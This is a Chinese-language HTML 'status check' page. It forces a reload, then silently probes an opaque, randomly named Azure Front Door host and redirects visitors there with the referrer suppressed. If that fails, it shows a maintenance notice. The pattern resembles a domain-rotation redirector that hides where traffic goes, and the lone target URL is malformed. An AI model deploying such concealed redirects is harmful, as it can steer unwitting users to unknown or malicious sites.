<!DOCTYPE html>
<html lang="zh-CN">
<head>
<meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1">
<meta name="referrer" content="no-referrer">
<title>状态检测</title>
<style>
  body { font-family: Arial, sans-serif; text-align: center; padding: 2rem; }

  /* loading spinner + 文本 */
  #loading {
    display: flex;
    flex-direction: column;
    align-items: center;
    font-size: 1.2rem;
    color: #555;
    gap: 10px;
    margin-bottom: 20px;
  }
  #spinner {
    width: 40px;
    height: 40px;
    border: 4px solid #ddd;
    border-top-color: #3b82f6;
    border-radius: 50%;
    animation: spin 1s linear infinite;
  }
  @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }

  /* 弹跳小点动画 */
  #elastic {
    display: none;
    justify-content: center;
    gap: 6px;
    margin-top: 10px;
  }
  #elastic div {
    width: 10px;
    height: 10px;
    background: #ef4444;
    border-radius: 50%;
    animation: scale 0.6s infinite alternate;
  }
  #elastic div:nth-child(2){ animation-delay: 0.2s; }
  #elastic div:nth-child(3){ animation-delay: 0.4s; }
  @keyframes scale { from { transform: scale(1); } to { transform: scale(1.6); } }

  #maintenance {
    display: none;
    font-size: 18px;
    margin-top: 20px;
    color: #333;
  }
</style>
</head>
<body>

<div id="loading">
  正在检测网络状态，请稍候.....
  <div id="spinner"></div>
</div>

<div id="maintenance">系统维护中，请稍后再试。</div>
<div id="elastic">
  <div></div><div></div><div></div>
</div>

<script>
  // 页面加载立即强制刷新一次（避免缓存）
  if (!window.location.href.includes("forceReload")) {
    window.location.href = window.location.href + (window.location.href.includes("?") ? "&" : "?") + "forceReload=" + Date.now();
  }
</script>

<script>
const targets = [
  "1https://bnq12-b4hdh8hchsbdh5ap.a01.azurefd.net"
];
const TIMEOUT = 8000; // 每个 URL 最大等待时间（毫秒）

async function detectAndRedirect() {
  let redirected = false;

  // 并行检测所有 URL
  const checks = targets.map(url => 
    new Promise(resolve => {
      const controller = new AbortController();
      const timeout = setTimeout(() => {
        controller.abort();
        resolve({ url, ok: false });
      }, TIMEOUT);

      fetch(url, { method: "GET", mode: "no-cors", signal: controller.signal })
        .then(() => {
          clearTimeout(timeout);
          resolve({ url, ok: true });
        })
        .catch(() => {
          clearTimeout(timeout);
          resolve({ url, ok: false });
        });
    })
  );

  // 谁先返回有效，立即跳转
  for await (const result of checks) {
    if (result.ok && !redirected) {
      redirected = true;
      window.location.href = result.url;
      return;
    }
  }

  // 全部无效，显示维护中 + 弹跳动画
  document.getElementById("loading").style.display = "none";
  document.getElementById("maintenance").style.display = "block";
  document.getElementById("elastic").style.display = "flex";
}

detectAndRedirect();
</script>
</body>
</html>
